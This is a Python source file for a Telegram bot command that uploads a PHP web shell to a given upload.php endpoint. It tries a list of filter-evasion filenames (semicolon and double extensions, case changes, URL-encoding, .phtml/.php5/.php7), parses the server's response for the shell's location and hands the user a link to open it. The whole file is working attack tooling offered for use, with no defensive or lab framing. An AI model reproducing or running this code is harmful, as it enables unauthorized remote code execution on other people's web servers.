from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, CommandHandler
import aiohttp
import os
import mimetypes
import re

async def autoupload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async def safe_send(msg, **kwargs):
        try:
            return await update.message.reply_text(msg, **kwargs)
        except Exception:
            pass

    if not context.args:
        return await safe_send("❌ Usage:\n`/autoupload <upload.php URL> [optional shell path]`", parse_mode="Markdown")

    upload_url = context.args[0]
    shell_path = context.args[1] if len(context.args) > 1 else "data/shell.php"

    if not upload_url.endswith(".php"):
        return await safe_send("❌ That doesn't look like a valid uploader endpoint ending in `.php`.")

    if not os.path.exists(shell_path):
        return await safe_send(f"❌ Shell file not found at: `{shell_path}`", parse_mode="Markdown")

    await safe_send(f"📤 Trying to upload `{os.path.basename(shell_path)}` to:\n`{upload_url}`", parse_mode="Markdown")

    base_url = upload_url.rsplit("/", 1)[0]

    possible_filenames = [
        "shell.php", "shell.php;.jpg", "shell.ph%70", "shell.pHp", "shell.phtml",
        "shell.php5", "shell.php7", "shell.php;.png", "shell.php..jpg", "sh3ll.php"
    ]

    uploaded_name = None
    async with aiohttp.ClientSession() as session:
        for filename in possible_filenames:
            with open(shell_path, "rb") as f:
                files = {'file': (filename, f, mimetypes.guess_type(filename)[0] or 'application/octet-stream')}
                try:
                    async with session.post(upload_url, data=files) as resp:
                        text = await resp.text()
                        if resp.status == 200:
                            # Try to find where it got uploaded
                            found_links = re.findall(r'(?:href|src)=["\']?([^"\'>]+)', text)
                            for link in found_links:
                                if any(ext in link.lower() for ext in ['.php', '.phtml', '.php5', '.php7']):
                                    if not link.startswith("http"):
                                        link = base_url + "/" + link.lstrip("/")
                                    uploaded_name = os.path.basename(link)
                                    shell_url = link
                                    break
                            if uploaded_name:
                                break
                except Exception as e:
                    print(f"[!] Upload error: {e}")
                    continue

    if uploaded_name:
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Open Shell", url=shell_url)]])
        return await safe_send(f"✅ Shell uploaded:\n`{uploaded_name}`\n🌐 [View Shell]({shell_url})", parse_mode="Markdown", reply_markup=keyboard)

    return await safe_send("❌ Upload failed or shell not found in response HTML.")
